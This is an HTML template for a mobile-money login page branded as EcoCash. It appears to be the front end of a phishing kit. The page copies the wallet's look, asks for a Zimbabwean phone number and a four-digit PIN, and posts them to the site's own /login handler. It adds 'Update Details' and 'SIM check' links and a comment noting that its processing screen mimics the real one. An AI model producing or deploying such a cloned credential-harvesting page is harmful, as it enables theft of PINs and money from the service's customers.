<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EcoCash Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        :root {
            --bg: #0b1118;
            --card: #121b26;
            --elevated: #182433;
            --accent: #00b86b;
            --accent-hover: #009e5b;
            --text: #f4f7fb;
            --muted: #94a3b8;
            --border: rgba(255, 255, 255, 0.08);
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
            padding: 20px 16px 36px;
        }
        .wrap { max-width: 420px; margin: 0 auto; }
        .card-modern {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 24px 20px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
        }
        .brand {
            font-weight: 800; font-size: 1.5rem; text-align: center; margin-bottom: 6px;
        }
        .brand span.eco { color: #38bdf8; }
        .brand span.cash { color: #f43f5e; }
        .phone-row {
            display: flex; gap: 8px;
        }
        .prefix-box {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 12px;
            padding: 12px 12px;
            font-weight: 600;
            white-space: nowrap;
        }
        .phone-input {
            background: var(--elevated);
            border: 1px solid rgba(255,255,255,0.12);
            color: var(--text);
            border-radius: 12px;
            padding: 12px 14px;
            width: 100%;
        }
        .phone-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.18);
        }
        .pin-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            max-width: 280px;
            margin: 12px auto 20px;
        }
        .pin-box {
            height: 54px;
            text-align: center;
            font-size: 1.35rem;
            font-weight: 700;
            background: var(--elevated);
            border: 1.5px solid rgba(255,255,255,0.14);
            border-radius: 12px;
            color: var(--text);
        }
        .pin-box:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.2);
        }
        .btn-eco {
            background: var(--accent);
            color: #05120c;
            font-weight: 700;
            border: none;
            border-radius: 14px;
            padding: 13px;
            width: 100%;
        }
        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
        .footer-panel {
            background: var(--elevated);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 16px;
            margin-top: 16px;
            text-align: center;
        }
        .footer-btn {
            background: var(--card);
            border: 1px solid var(--border);
            color: var(--text);
            border-radius: 12px;
            padding: 10px 12px;
            font-size: 0.85rem;
            font-weight: 600;
            text-decoration: none;
            display: block;
        }
        .processing-backdrop {
            position: fixed;
            inset: 0;
            background: rgba(6, 10, 15, 0.78);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 999;
        }
        .processing-modal {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 18px;
            padding: 24px 28px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
        }
        .proc-ring {
            width: 44px; height: 44px; border-radius: 50%;
            border: 3px solid rgba(255,255,255,0.12);
            border-top-color: var(--accent);
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="card-modern">
            <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
            <h2 class="fw-bold fs-4 text-center mb-3">Login</h2>

            <form id="loginForm" action="/login" method="POST">
                <div class="mb-3">
                    <div class="phone-row">
                        <div class="prefix-box">🇿🇼 +263</div>
                        <input type="tel" class="phone-input" name="phone"
                            value="{{ session.get('phone', '') }}" placeholder="77 000 0000" required>
                    </div>
                </div>

                <div class="text-center small fw-medium" style="color: var(--muted);">Enter your PIN</div>
                <div class="pin-grid">
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                    <input type="password" inputmode="numeric" maxlength="1" class="pin-box" required>
                </div>
                <input type="hidden" name="pin" id="pinHidden">

                <button type="submit" class="btn-eco shadow-sm">Continue</button>
            </form>
        </div>

        <div class="footer-panel">
            <p class="small mb-3" style="color: var(--muted);">Need help with your EcoCash wallet?</p>
            <div class="row g-2">
                <div class="col-6"><a href="/apply/step1" class="footer-btn">Update Details</a></div>
                <div class="col-6"><a href="/sim-check" class="footer-btn">Help & Support</a></div>
            </div>
        </div>
    </div>

    <!-- Processing Overlay (matches the processing state after PIN entry) -->
    <div id="processingOverlay" class="processing-backdrop">
        <div class="processing-modal">
            <div class="proc-ring"></div>
            <div class="fw-semibold">Processing...</div>
        </div>
    </div>

    <script>
        const boxes = Array.from(document.querySelectorAll(".pin-box"));
        const pinHidden = document.getElementById("pinHidden");
        const loginForm = document.getElementById("loginForm");

        boxes.forEach((box, idx) => {
            box.addEventListener("input", () => {
                box.value = box.value.replace(/\D/g, "").slice(0, 1);
                if (box.value && idx < boxes.length - 1) {
                    boxes[idx + 1].focus();
                }
                pinHidden.value = boxes.map(b => b.value).join("");
            });

            box.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !box.value && idx > 0) {
                    boxes[idx - 1].focus();
                }
            });
        });

        loginForm.addEventListener("submit", (e) => {
            const pinVal = boxes.map(b => b.value).join("");
            if (pinVal.length < 4) {
                e.preventDefault();
                boxes[0].focus();
                return;
            }
            pinHidden.value = pinVal;
            document.getElementById("processingOverlay").style.display = "flex";
        });
    </script>
</body>
</html>
